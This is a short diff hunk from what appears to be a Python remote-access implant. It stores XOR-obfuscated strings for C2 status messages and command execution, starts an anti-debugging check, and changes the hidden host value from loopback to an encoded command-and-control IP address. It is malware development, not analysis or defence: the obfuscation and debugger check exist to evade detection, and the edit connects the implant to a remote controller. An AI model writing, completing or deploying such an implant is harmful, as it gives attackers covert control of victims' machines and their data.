@@ -23,7 +23,7 @@ STR_COMMAND_RECEIVED = "\x10'!'+4'&b!-//#,&" #bitwise XOR of msg - "Received com
 STR_SENDING_OUTPUT = "\x11',&+,%b-76276" #bitwise XOR of msg - "Sending output" with 0x42
 STR_CONNECTED_TO_SERVER = "\x01-,,'!6'&b6-b\x01pb1'04'0" #bitwise XOR of msg - "Connected to C2 server" with 0x42
 STR_COMMAND_TOOK_LONG = "\x01-//#,&b6--)b6--b.-,%b6-b':'!76'" #bitwise XOR of msg - "Command took too long to execute" with 0x42
-STR_HOST = "vvlppplpp{lpqt" #bitwise XOR of 127.0.0.1
+STR_HOST = "qvlppvluslw{" #bitwise XOR of C2 IP
 STR_CD = "\x01*#,%'&b&+0'!6-0;b6-b"#bitwise XOR of Changed directory to
 
 def check_debugger():
